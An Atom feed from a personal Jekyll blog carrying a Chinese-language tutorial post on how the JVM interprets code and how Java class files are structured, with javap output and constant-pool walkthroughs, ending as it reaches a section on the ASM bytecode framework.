<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-16T00:39:32+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Theoyu</title><subtitle>Be cool,but also be warm.
</subtitle><author><name>Theoyu</name><email>zeyu.ou@foxmail.com</email></author><entry><title type="html">浅谈jvm和字节码</title><link href="http://localhost:4000/2022/01/19/jvmANDbytecode.html" rel="alternate" type="text/html" title="浅谈jvm和字节码" /><published>2022-01-19T00:00:00+08:00</published><updated>2022-01-19T00:00:00+08:00</updated><id>http://localhost:4000/2022/01/19/jvmANDbytecode</id><content type="html" xml:base="http://localhost:4000/2022/01/19/jvmANDbytecode.html"><![CDATA[<p>第一部分，我们简单谈一谈jvm解释执行的依据；第二部分关于字节码，也算是对《深入理解Java虚拟机》一书的实践；最后会简单介绍两种字节码操作框架，以实现字节码插桩。</p>

<!--more-->

<h2 id="jvm解释执行">jvm解释执行</h2>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220209190348.png" alt="image-20220209190348623" /></p>

<p>在Java语言中，Javac编译器完成了程序代码经过词法分析、语法分析到抽象语法树，再遍历语法树生成线性的字节码指令流的过程。</p>

<p>执行引擎在解析字节码文件的时候，并不只有解释执行一种情况，也可以通过编译执行( 即通过即时编译器产生本地代码执行 )，这种方式也称为 <a href="https://aboullaite.me/understanding-jit-compiler-just-in-time-compiler/">jit</a> 。不过无论哪种方式，输入的都是字节码二进制流，输出的都是执行结果，所以处理的过程其实都是等效的，区别只在于执行速度有所不同。</p>

<h3 id="基于栈的字节码解释执行引擎">基于栈的字节码解释执行引擎</h3>

<p>关于字节码的解释执行，其实下面的伪代码就可以说明：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">do</span> <span class="p">{</span>
    <span class="err">获取下一个指令</span>
    <span class="err">解释指令</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="err">还有指令</span><span class="p">);</span>
</code></pre></div></div>

<p>谈到指令，就离不开指令集的架构，笔者二进制方面较弱，所以也只用通俗易懂(<del>抽象</del>)的语言来描述。</p>

<p>我们分别用<strong>基于寄存器的方案</strong>和<strong>基于栈的方案</strong>，来表示<code class="language-plaintext highlighter-rouge">1+1</code>：</p>

<p><strong>基于寄存器的方案</strong>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov eax,1
add eax,1
</code></pre></div></div>

<p><strong>基于栈的方案</strong>：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>push_1
push_1
add 
</code></pre></div></div>

<p>如同《 深入理解Java虚拟机 》所说的：『 Java输出的字节码指令流，<strong>基本上</strong>是一种基于栈的指令集架构 』。为什么有<strong>基本上</strong>三个字呢？因为纯粹基于栈的指令集架构应当全部是零地址指令，也就是不存在显式参数的。如果你对PVM(Python Virtual Machine)有所了解，知道Python解释执行分为栈区(Stack)和存储区(Memo)两大块，JVM也不列外，其使用<strong>局部变量表</strong>辅助栈区执行。</p>

<p><strong>局部变量表</strong>：栈帧内部的数据结构, 是个数组. 通过数组位置访问，换个说法也可以当作可以特殊的<strong>寄存器</strong>。</p>

<p>那么JVM解释执行的方式，其实可以当作<strong>栈和寄存器混合执行</strong>来看待。</p>

<p>我们把下列代码转化为JVM指令看看</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">d</span> <span class="o">=</span> <span class="n">b</span> <span class="o">-</span> <span class="n">a</span><span class="p">;</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">d</span> <span class="o">-</span> <span class="n">c</span><span class="p">;</span>
<span class="n">System</span><span class="p">.</span><span class="n">out</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
</code></pre></div></div>

<p>其中类似<code class="language-plaintext highlighter-rouge">1+1</code>的指令，在前端就已经被javac优化，下列指令中，我们用分别把栈帧和局部变量表表示一下(前面为栈帧，左边为栈顶；后面为局部变量表)</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">0</span> <span class="n">iconst_2</span> <span class="c1">// (2)</span>
 <span class="mi">1</span> <span class="n">istore_1</span> <span class="c1">// ()      {1:2}</span>
 <span class="mi">2</span> <span class="n">iconst_4</span> <span class="c1">// (4)     {1:2}</span>
 <span class="mi">3</span> <span class="n">istore_2</span> <span class="c1">// ()      {1:2, 2:4}</span>
 <span class="mi">4</span> <span class="n">iconst_3</span> <span class="c1">// (3)</span>
 <span class="mi">5</span> <span class="n">istore_3</span> <span class="c1">// ()      {1:2, 2:4, 3:3}</span>
 <span class="mi">6</span> <span class="n">iload_2</span>  <span class="c1">// (4)     {1:2, 2:4, 3:3}</span>
 <span class="mi">7</span> <span class="n">iload_1</span>  <span class="c1">// (2,4)   {1:2, 2:4, 3:3}</span>
 <span class="mi">8</span> <span class="n">isub</span>     <span class="c1">// (2)     {1:2, 2:4, 3:3}</span>
 <span class="mi">9</span> <span class="n">istore</span> <span class="mi">4</span> <span class="c1">// ()      {1:2, 2:4, 3:3, 4:2}</span>
<span class="mi">11</span> <span class="n">iload</span> <span class="mi">4</span>  <span class="c1">// (2)     {1:2, 2:4, 3:3, 4:2}</span>
<span class="mi">13</span> <span class="n">iload_3</span>  <span class="c1">// (3,2)   {1:2, 2:4, 3:3, 4:2}</span>
<span class="mi">14</span> <span class="n">isub</span>     <span class="c1">// (-1)    {1:2, 2:4, 3:3, 4:2}</span>
<span class="mi">15</span> <span class="n">istore</span> <span class="mi">4</span> <span class="c1">// ()      {1:2, 2:4, 3:3, 4:-1}</span>
<span class="mi">17</span> <span class="n">getstatic</span> <span class="err">#</span><span class="mi">2</span> <span class="o">&lt;</span><span class="n">java</span><span class="o">/</span><span class="n">lang</span><span class="o">/</span><span class="n">System</span><span class="p">.</span><span class="n">out</span> <span class="o">:</span> <span class="n">Ljava</span><span class="o">/</span><span class="n">io</span><span class="o">/</span><span class="n">PrintStream</span><span class="p">;</span><span class="o">&gt;</span>  <span class="c1">// (java/lang/System.out : Ljava/io/PrintStream;) {1:2, 2:4, 3:3, 4:-1}</span>
<span class="mi">20</span> <span class="n">iload</span> <span class="mi">4</span>  <span class="c1">// (-1,java/lang/System.out : Ljava/io/PrintStream;)</span>
<span class="mi">22</span> <span class="n">invokevirtual</span> <span class="err">#</span><span class="mi">3</span> <span class="o">&lt;</span><span class="n">java</span><span class="o">/</span><span class="n">io</span><span class="o">/</span><span class="n">PrintStream</span><span class="p">.</span><span class="n">println</span> <span class="o">:</span> <span class="p">(</span><span class="n">I</span><span class="p">)</span><span class="n">V</span><span class="o">&gt;</span> <span class="c1">// println(-1)</span>
<span class="mi">25</span> <span class="k">return</span>
</code></pre></div></div>

<p>纯粹基于栈的方案，貌似没有，因为只有<code class="language-plaintext highlighter-rouge">pop</code>,<code class="language-plaintext highlighter-rouge">push</code>操作的话，在局部变量较多的情况下，需要频繁的搬运数据，防止之前的局部变量消失。</p>

<p>我们所说的指令，也就是字节码指令，其从Class文件中解析出来，Class文件本身是静态的，解析Class文件不是什么高深的技术，在 <a href="https://docs.oracle.com/javase/specs/jvms/se8/html/">Java虚拟机规范</a> 下我们可以很好的理解， 下面我们通过几个字节码查看工具走近字节码。</p>

<h2 id="走近字节码">走近字节码</h2>

<p>Class文件是一组以字节为基础单位的二进制流，各个数据严格按照顺序紧凑排列在文件中，我们可以依靠一些工具反编译二进制流，得到详细的数据信息和指令。</p>

<p>反汇编(disassembly)和反编译(decompile)是两个不等同的概念，在java中，反汇编是指是将.class文件转换成opcode，反编译是指将.class文件转换为.java文件，是更加高级的体现。IDEA自带的反编译就非常强大，基本上可以完全复原代码，不过本文是站在字节码角度的分析，所以还是更加侧重于前者。</p>

<p><strong>javap</strong></p>

<p>javap是jdk自带的反解析工具。它的作用就是根据class字节码文件，反解析出当前类对应的code区（汇编指令）、本地变量表、异常表和代码行偏移量映射表、常量池等等信息。</p>

<pre><code class="language-txt">javap -help                          
用法: javap &lt;options&gt; &lt;classes&gt;
其中, 可能的选项包括:
  -help  --help  -?        输出此用法消息
  -version                 版本信息
  -v  -verbose             输出附加信息
  -l                       输出行号和本地变量表
  -public                  仅显示公共类和成员
  -protected               显示受保护的/公共类和成员
  -package                 显示程序包/受保护的/公共类
                           和成员 (默认)
  -p  -private             显示所有类和成员
  -c                       对代码进行反汇编
  -s                       输出内部类型签名
  -sysinfo                 显示正在处理的类的
                           系统信息 (路径, 大小, 日期, MD5 散列)
  -constants               显示最终常量
  -classpath &lt;path&gt;        指定查找用户类文件的位置
  -cp &lt;path&gt;               指定查找用户类文件的位置
  -bootclasspath &lt;path&gt;    覆盖引导类文件的位置
</code></pre>

<p>后续我们对以下代码的Class文件进行反编译</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">demo</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
        <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">"theoyu"</span><span class="o">;</span>
        <span class="n">say</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="kt">void</span> <span class="nf">say</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">){</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">🌀</span>  <span class="n">classes</span>  <span class="n">javap</span>  <span class="o">-</span><span class="n">c</span> <span class="n">demo</span><span class="o">.</span><span class="na">Test2</span>
<span class="nc">Compiled</span> <span class="n">from</span> <span class="s">"Test2.java"</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">demo</span><span class="o">.</span><span class="na">Test2</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="n">demo</span><span class="o">.</span><span class="na">Test2</span><span class="o">();</span>
    <span class="nl">Code:</span>
       <span class="mi">0</span><span class="o">:</span> <span class="n">aload_0</span>
       <span class="mi">1</span><span class="o">:</span> <span class="n">invokespecial</span> <span class="err">#</span><span class="mi">1</span>                  <span class="c1">// Method java/lang/Object."&lt;init&gt;":()V</span>
       <span class="mi">4</span><span class="o">:</span> <span class="k">return</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">[]);</span>
    <span class="nl">Code:</span>
       <span class="mi">0</span><span class="o">:</span> <span class="n">bipush</span>        <span class="mi">10</span>
       <span class="mi">2</span><span class="o">:</span> <span class="n">istore_1</span>
       <span class="mi">3</span><span class="o">:</span> <span class="n">ldc</span>           <span class="err">#</span><span class="mi">2</span>                  <span class="c1">// String theoyu</span>
       <span class="mi">5</span><span class="o">:</span> <span class="n">astore_2</span>
       <span class="mi">6</span><span class="o">:</span> <span class="n">aload_2</span>
       <span class="mi">7</span><span class="o">:</span> <span class="n">invokestatic</span>  <span class="err">#</span><span class="mi">3</span>                  <span class="c1">// Method say:(Ljava/lang/String;)V</span>
      <span class="mi">10</span><span class="o">:</span> <span class="k">return</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">say</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">);</span>
    <span class="nl">Code:</span>
       <span class="mi">0</span><span class="o">:</span> <span class="n">getstatic</span>     <span class="err">#</span><span class="mi">4</span>                  <span class="c1">// Field java/lang/System.out:Ljava/io/PrintStream;</span>
       <span class="mi">3</span><span class="o">:</span> <span class="n">aload_0</span>
       <span class="mi">4</span><span class="o">:</span> <span class="n">invokevirtual</span> <span class="err">#</span><span class="mi">5</span>                  <span class="c1">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span>
       <span class="mi">7</span><span class="o">:</span> <span class="k">return</span>
<span class="o">}</span>
</code></pre></div></div>

<p>如果需要查看常量池，局部变量表等信息，可以用<code class="language-plaintext highlighter-rouge">javap - v</code>打印</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javap  -v demo.Test2
Constant pool:
   #1 = Methodref          #7.#27         // java/lang/Object."&lt;init&gt;":()V
   #2 = String             #28            // theoyu
   #3 = Methodref          #6.#29         // demo/Test2.say:(Ljava/lang/String;)V
...
...
 LocalVariableTable:
        Start  Length  Slot  Name   Signature
            0      11     0  args   [Ljava/lang/String;
            3       8     1     a   I
            6       5     2  name   Ljava/lang/String;
...
...
</code></pre></div></div>

<p>当然这些概念我们会在后续介绍。idea支持的jclasslib工具可以可视化查看字节码文件，并且支持直接跳转到《Java虚拟机规范》中查看陌生指令，以及直接修改操作码。</p>

<p><strong>jclasslib</strong></p>

<p>在idea插件中下载jclasslib后，就可以直接打开class文件查看</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220210155153.png" alt="image-20220210155153889" /></p>

<p><strong>classpy &amp;&amp; ClassViewer</strong></p>

<p><a href="https://github.com/zxh0/classpy">classpy </a>是《自己动手写Java虚拟机》一书作者写的查看class文件的gui工具，后续还拓展了lua、wasm等文件格式，不过其兼容性不是很好，可以用更加精简美观的<a href="https://github.com/ClassViewer/ClassViewer">ClassViewer</a>代替。</p>

<p><strong>ClassViewer</strong>：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220210161545.png" alt="image-20220210161545940" /></p>

<p>字节码文件按照以下10个部分的固定顺序组成。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220210170340.png" alt="image-20220210170340077" /></p>

<p>根据《Java虚拟机规范》的规定，Class文件格式采用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型:“无符号数”和“表”，无符号数属于基本数据结构，表由多个无符号数或者其他表作为数据项构成，为了区分，表的命名以<strong>_info</strong>结尾，所以上述10个部分又可以列作为：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ClassFile</span> <span class="p">{</span>
    <span class="n">u4</span>             <span class="n">magic</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">minor_version</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">major_version</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">constant_pool_count</span><span class="p">;</span>
    <span class="n">cp_info</span>        <span class="n">constant_pool</span><span class="p">[</span><span class="n">constant_pool_count</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">u2</span>             <span class="n">access_flags</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">this_class</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">super_class</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">interfaces_count</span><span class="p">;</span>
    <span class="n">u2</span>             <span class="n">interfaces</span><span class="p">[</span><span class="n">interfaces_count</span><span class="p">];</span>
    <span class="n">u2</span>             <span class="n">fields_count</span><span class="p">;</span>
    <span class="n">field_info</span>     <span class="n">fields</span><span class="p">[</span><span class="n">fields_count</span><span class="p">];</span>
    <span class="n">u2</span>             <span class="n">methods_count</span><span class="p">;</span>
    <span class="n">method_info</span>    <span class="n">methods</span><span class="p">[</span><span class="n">methods_count</span><span class="p">];</span>
    <span class="n">u2</span>             <span class="n">attributes_count</span><span class="p">;</span>
    <span class="n">attribute_info</span> <span class="n">attributes</span><span class="p">[</span><span class="n">attributes_count</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<p>接下来我们一一介绍这10个部分：</p>

<h3 id="1-魔数magic-number">(1) 魔数(Magic Number)</h3>

<p>魔数也就是一个标识头，占用四个字节，其值为<strong>『cafebaby』</strong>，说明这是一个字节码文件。</p>

<p>常见的文件头还有zip文件头<strong>504B0304</strong>，JPEG文件头<strong>FFD8FF</strong>等。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220210180039.png" alt="image-20220210180039782" /></p>

<h3 id="2版本号version">(2)版本号(Version)</h3>

<p>版本号为魔数之后的4个字节，前两个字节表示次版本号（Minor Version），后两个字节表示主版本号（Major Version），如上图中的<strong>『00 00 00 34』</strong> ,主版本号化为10进制为52，代表JDK1.8，以此类推51即代表JDK1.7。</p>

<h3 id="3常量池constant-pool">(3)常量池(Constant Pool)</h3>

<p>常量池是是Class文件里的资源仓库，首先是常量池容量计数器(constant_pool_count)，说白了就是用来记录常量池中常量的个数，用2个字节来记录。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220212104824.png" alt="image-20220212104824796" /></p>

<p>这里常量池容量计数器值为为41，但我们打印发现实际上常量个数只有40个：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Constant pool:
   #1 = Methodref          #7.#27         // java/lang/Object."&lt;init&gt;":()V
   #2 = String             #28            // theoyu
   #3 = Methodref          #6.#29         // demo/Test2.say:(Ljava/lang/String;)V
   #4 = Fieldref           #30.#31        // java/lang/System.out:Ljava/io/PrintStream;
   #5 = Methodref          #32.#33        // java/io/PrintStream.println:(Ljava/lang/String;)V
   #6 = Class              #34            // demo/Test2
   #7 = Class              #35            // java/lang/Object
   #8 = Utf8               &lt;init&gt;
   #9 = Utf8               ()V
  #10 = Utf8               Code
  #11 = Utf8               LineNumberTable
  #12 = Utf8               LocalVariableTable
  #13 = Utf8               this
  #14 = Utf8               Ldemo/Test2;
  #15 = Utf8               main
  #16 = Utf8               ([Ljava/lang/String;)V
  #17 = Utf8               args
  #18 = Utf8               [Ljava/lang/String;
  #19 = Utf8               a
  #20 = Utf8               I
  #21 = Utf8               name
  #22 = Utf8               Ljava/lang/String;
  #23 = Utf8               say
  #24 = Utf8               (Ljava/lang/String;)V
  #25 = Utf8               SourceFile
  #26 = Utf8               Test2.java
  #27 = NameAndType        #8:#9          // "&lt;init&gt;":()V
  #28 = Utf8               theoyu
  #29 = NameAndType        #23:#24        // say:(Ljava/lang/String;)V
  #30 = Class              #36            // java/lang/System
  #31 = NameAndType        #37:#38        // out:Ljava/io/PrintStream;
  #32 = Class              #39            // java/io/PrintStream
  #33 = NameAndType        #40:#24        // println:(Ljava/lang/String;)V
  #34 = Utf8               demo/Test2
  #35 = Utf8               java/lang/Object
  #36 = Utf8               java/lang/System
  #37 = Utf8               out
  #38 = Utf8               Ljava/io/PrintStream;
  #39 = Utf8               java/io/PrintStream
  #40 = Utf8               println
</code></pre></div></div>

<p>这是因为常量池中的常量计数是从1开始的，默认第0个是null。</p>

<p>所以数据区是由 <strong>constant_pool_count-1</strong> 个cp_info表组成，在 jdk1.8版本的字节码中共有14种类型的cp_info( jdk16更新为17种 )，每种类型的结构都是固定的。</p>

<p><img src="https://p0.meituan.net/travelcube/f5bdc7e8203ec666a531fcd19cdbcddc519208.png" alt="图6 各类型的cp_info" /></p>

<p>我们以最为<strong>CONSTANT_utf8_info</strong>为例，其tag为01，对应utf8类型，接下来两个字节标识该字符串的长度Length，然后Length个字节为这个字符串具体的值。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220212115637.png" alt="image-20220212115637072" /></p>

<p>其他类型的cp_info不再赘述，整体结构大同小异，总的来说就是以下几个过程：</p>

<ol>
  <li>
    <p>第一步：先找tag位</p>
  </li>
  <li>
    <p>第二步：根据tag的值从常量项表中找到对应的常量项结构</p>
  </li>
  <li>
    <p>第三步：根据常量项的结构，我们找出对应的字节</p>
  </li>
  <li>
    <p>第四步：根据字节，转化为具体值</p>
  </li>
</ol>

<h3 id="4访问标志access_flag">(4)访问标志(access_flag)</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220212124300.png" alt="image-20220212124300303" /></p>

<p>常量池结束之后的两个字节，描述该Class是类还是接口，以及是否被Public、Abstract、Final等修饰符修饰。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220212124411.png" alt="image-20220212124411633" /></p>

<p>如上图 <strong>00 21</strong>，其还可以表示一种组合，是<strong>0x0001+0x0020</strong> ，即<strong>ACC_PUBLIC和ACC_SUPER</strong>。</p>

<h3 id="5-6-7类索引父类索引与接口索引集合">(5 6 7)类索引、父类索引与接口索引集合</h3>

<p>在类的访问标志下方就是<strong>类索引</strong>，占2个字节，在字节码中找到是<strong>00 06</strong>，它的涵义是索引，所以我们就去常量池表中找索引为6的值，发现指向的就是<strong>demo/Test2</strong>的索引</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220212130645.png" alt="image-20220212130645934" /></p>

<p>父类索引同理，父类索引后为两字节的接口计数器，描述了该类或父类实现的接口数量。紧接着的n个字节是所有接口名称的字符串常量的索引值。</p>

<h3 id="8字段表fileds">(8)字段表(fileds)</h3>

<p>字段表用于描述类和接口中声明的变量，包含类级别的变量以及实例变量，但是不包含方法内部声明的局部变量。同常量池，字段表也分为两部分，第一部分两个字节为fields_count，描述字段个数；第二部分是fields_count个字段的详细信息fields_info。</p>

<p>上述的代码因为变量都是写在函数内，为局部变量，不存在字段，我们以下述代码为例：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">demo</span><span class="o">;</span>

<span class="kd">public</span>  <span class="kd">class</span> <span class="nc">Test3</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span> <span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220213161459.png" alt="image-20220213161459739" /></p>

<p>最开始的两个字节为<strong>访问标志</strong>，这个我们已经比较熟悉了，往后分别是<strong>字段名称</strong>和<strong>字段描述符</strong>，对应的都是常量池的索引，可以查询其值。</p>

<p>再往后的两个字节是属性表个数，如果一个字段被 <strong>final static</strong> 、<strong>volatile</strong> 等关键字修饰，比如 ` final static public int age = 100`，那么属性表中还会有一项称为 <strong>ConstantValue</strong> 的属性，其值指向常量 100 ，关于属性表后续还会介绍。</p>

<h3 id="9方法表metheds">(9)方法表(metheds)</h3>

<p>字段表结束后为方法表，方法表也是由两部分组成，前两个字节描述方法的个数；第二部分为每个方法的详细信息。方法的详细信息较为复杂，包括方法的访问标志、方法名、方法的描述符以及方法的属性，如下图所示：</p>

<p><img src="https://p0.meituan.net/travelcube/d84d5397da84005d9e21d5289afa29e755614.png" alt="图12 方法表结构" /></p>

<p>再拿这一段代码看看，在这个案例中一共有 <strong>构造方法、main方法、say</strong> 三个方法</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">demo</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test2</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span>
        <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">"theoyu"</span><span class="o">;</span>
        <span class="n">say</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="kd">static</span> <span class="kt">void</span> <span class="nf">say</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">){</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220213164330.png" alt="image-20220213164330423" /></p>

<p>方法的权限修饰符和之前的访问权限大同小异，方法名和方法的描述符都是常量池中的索引值，可以通过索引值在常量池中找到。所以我们把重点放在<strong>方法的Code属性表</strong>这一部分。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220213164711.png" alt="image-20220213164711916" /></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220213173739.png" alt="image-20220213173739500" /></p>

<p><strong>attribute_name_index</strong>是一项指向<strong>CONSTANT_Utf8_info</strong>型常量的索引，此常量值固定为“Code”，<strong>attribute_length</strong> 代表属性值的长度。</p>

<p><strong>max_stack</strong>代表操作数栈(<strong>Operand Stack</strong>)深度的最大值，虚拟机运行的时候需要根据这个值来分配栈帧(Stack Frame)中的操作栈深度。</p>

<p><strong>max_locals</strong>代表了局部变量表所需的存储空间。在这里，<strong>max_locals</strong>的单位是变量槽(Slot)，变量槽是虚拟机为局部变量分配内存所使用的最小单位。在main函数中，一共有<strong>args、a、name</strong> 三个局部变量，所以大小为3。</p>

<p><strong>code_length</strong> 和 <strong>code</strong> 用于存储Java源程序编译后生成的字节码指令。</p>

<p><strong>attributes</strong>属性表中存储有<strong>LineNumberTable</strong>和<strong>LocalVariableTable</strong>两个重要属性：</p>

<ul>
  <li>“LineNumberTable”：行号表，将Code区的操作码和源代码中的行号对应，Debug时会起到作用（源代码走一行，需要走多少个JVM指令操作码）。</li>
  <li>“LocalVariableTable”：局部变量表（也叫本地变量表），包含This和局部变量，之所以可以在每一个方法内部都可以调用This，是因为JVM将This作为每一个方法的第一个参数隐式进行传入。</li>
</ul>

<p>我们结合指令和局部变量表对下述代码的main函数分析，先提一下局部变量表的start_pc和length属性分别代表了这个局部变量的生命周期开始的字节码偏移量及其作用范围覆盖 的长度，两者结合起来就是这个局部变量在字节码之中的作用域范围。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/02/20220213205102.png" alt="image-20220213205101911" /></p>

<ul>
  <li>0 <code class="language-plaintext highlighter-rouge">bipush 10</code>：把 10 放在栈顶</li>
  <li>2 <code class="language-plaintext highlighter-rouge">istore_1</code>  ：把栈顶元素 10 存储到局部变量表序号 1，name_index 对应常量池索引19，其值为 a ，类型为 int ，对应代码 <code class="language-plaintext highlighter-rouge">int a = 10</code>，此指令结束代表局部变量 a 的生命周期开始，也就是对应 <strong>pc 3</strong>。</li>
  <li>3 <code class="language-plaintext highlighter-rouge">ldc #2</code> ：    把常量池索引为2的值( 字符串『theoyu』 ) 放在栈顶</li>
  <li>5 <code class="language-plaintext highlighter-rouge">astore_2</code> ： 把栈顶元素存储到局部变量表序号 2 ，name_index 对应常量池索引21，其值为 name ，类型为 String ，对应代码 <code class="language-plaintext highlighter-rouge">String name = "theoyu"</code>，此指令结束代表局部变量 name 的生命周期开始，也就是对应 <strong>pc 6</strong>。</li>
  <li>6 <code class="language-plaintext highlighter-rouge">aload_2</code>：引用 局部变量表 2的值『theoyu』到栈顶。</li>
  <li>7 <code class="language-plaintext highlighter-rouge">invokestatic #3</code> 调用 static method <code class="language-plaintext highlighter-rouge">demo/Test2.say</code>，传入栈顶参数『theoyu』</li>
  <li>10 <code class="language-plaintext highlighter-rouge">return</code></li>
</ul>

<p>所以整个字节码解释执行可以用以下伪代码描述：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">do</span> <span class="p">{</span>
  <span class="err">自动计算</span><span class="n">PC</span><span class="err">寄存器的值加</span><span class="mi">1</span><span class="p">;</span> 
  <span class="err">根据</span><span class="n">PC</span><span class="err">寄存器指示的位置，从字节码流中取出操作码</span><span class="p">;</span> 
  <span class="k">if</span> <span class="p">(</span><span class="err">字节码存在操作数</span><span class="p">)</span> <span class="err">从字节码流中取出操作数</span><span class="p">;</span> 
  <span class="err">执行操作码所定义的操作</span><span class="p">;</span>
<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="err">字节码流长度</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<h3 id="10附加属性表attributes">(10)附加属性表(attributes)</h3>

<p>字节码的最后一部分，该项存放了在该文件中类或接口所定义属性的基本信息。</p>

<h2 id="字节码修改">字节码修改</h2>

<p>在我们了解了字节码结构后，只用简单的文本编辑器，甚至你只需要一个vim，就可以随意修改字节码文件，但是这莫过于有些麻烦，而一些较为上层的框架就为我们提供了修改已有字节码、动态生成全新字节码的功能。</p>

<h3 id="asm">ASM</h3>

